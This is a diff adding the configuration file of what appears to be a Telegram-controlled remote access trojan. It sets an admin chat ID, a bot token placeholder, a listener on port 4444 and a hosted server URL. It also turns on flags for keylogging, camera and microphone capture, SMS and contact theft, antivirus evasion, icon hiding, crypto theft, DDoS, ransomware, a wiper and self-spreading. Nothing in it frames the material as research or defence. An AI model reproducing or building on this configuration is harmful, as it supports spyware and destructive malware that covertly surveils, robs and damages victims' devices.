@@ -1,0 +1,49 @@
+import os
+
+# ============== ADMIN CONFIGURATION ==============
+ADMIN_CHAT_ID = 6454347745  # আপনার Chat ID - শুধুমাত্র আপনি
+
+# Telegram Bot Token
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+
+# ============== SERVER ==============
+SERVER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
+LISTENER_PORT = int(os.environ.get("PORT", 4444))
+
+# ============== DATABASE ==============
+DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///sessions.db")
+
+# ============== ADVANCED FEATURES ==============
+ENABLE_ALL_FEATURES = True
+ENABLE_PERSISTENCE = True
+ENABLE_KEYLOGGER = True
+ENABLE_SCREEN_CAPTURE = True
+ENABLE_MICROPHONE = True
+ENABLE_CAMERA = True
+ENABLE_LOCATION = True
+ENABLE_SMS = True
+ENABLE_CALLS = True
+ENABLE_CONTACTS = True
+ENABLE_FILE_MANAGER = True
+ENABLE_APP_CONTROL = True
+ENABLE_SYSTEM_CONTROL = True
+ENABLE_NETWORK_CONTROL = True
+ENABLE_BLUETOOTH = True
+ENABLE_WIFI = True
+ENABLE_HOTSPOT = True
+ENABLE_VPN = True
+ENABLE_ROOT = True
+ENABLE_ENCRYPTION = True
+ENABLE_ANTI_AV = True
+ENABLE_HIDE_ICON = True
+ENABLE_CLIPBOARD = True
+ENABLE_NOTIFICATIONS = True
+ENABLE_BROWSER = True
+ENABLE_SOCIAL_MEDIA = True
+ENABLE_CRYPTO = True
+ENABLE_DDOS = True
+ENABLE_RANSOMWARE = True
+ENABLE_WIPER = True
+ENABLE_SPREADER = True
+ENABLE_BACKUP = True
+ENABLE_RECOVERY = True
